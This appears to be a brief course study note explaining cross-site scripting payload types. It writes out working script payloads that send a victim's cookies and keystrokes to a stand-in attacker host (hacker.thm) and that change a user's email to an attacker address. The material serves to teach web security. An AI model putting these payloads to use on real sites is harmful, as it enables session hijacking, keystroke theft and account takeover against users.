___
- tags: #xss 
___
## What is a payload?
In XSS, the payload is the Javascript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.
### Proof Of Concept
This is the simplest of payloads, where all you want to do is demontrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with string of text, for example:
```html
<script>alert('XSS')</script>
```
### Session Stealing
Details of a user's session, such as login tokens, are often kept in cookies on the targets machine.
```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```
### Key Logger
The below code acts as a key logger.
```html
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```
### Business Logic
This payload is a lot more specific than the above example.
```html
<script>user.changeEmail('attacker@hacker.thm');</script>
```
